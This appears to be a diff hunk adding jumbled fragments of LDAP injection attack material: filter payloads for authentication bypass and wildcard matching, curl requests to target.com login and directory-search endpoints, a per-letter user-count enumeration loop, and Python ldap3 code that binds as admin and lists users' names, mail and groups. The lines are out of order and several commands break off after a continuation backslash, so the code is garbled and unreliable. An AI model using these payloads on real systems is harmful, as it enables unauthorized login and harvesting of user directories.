@@ -1,0 +1,14 @@
+(&(cn=*)(|(cn=admin*)(sn=john)))
+(&(uid=USERNAME)(userPassword=PASSWORD))
+(&(uid=admin)(&)(userPassword=anything))
+/api/users/search?name=*)(|(cn=admin*
+COUNT=$(curl -s "https://target.com/api/directory/search?q=$LETTER*" | \
+GET /api/users/search?name=john
+c = Connection(s, user='cn=admin,dc=target,dc=com', password='pass', auto_bind=True)
+c.search('dc=target,dc=com', '(objectclass=person)', attributes=['cn','mail','memberOf'])
+curl -s "https://target.com/api/directory/search?q=john" | python3 -m json.tool
+curl -s -X POST https://target.com/api/login \
+curl -s -X POST https://target.com/sso/login \
+echo "$LETTER*: $COUNT users"
+python3 -c "import sys,json; d=json.load(sys.stdin); print(len(d.get('users',[])))")
+s = Server('target.com', get_info=ALL)
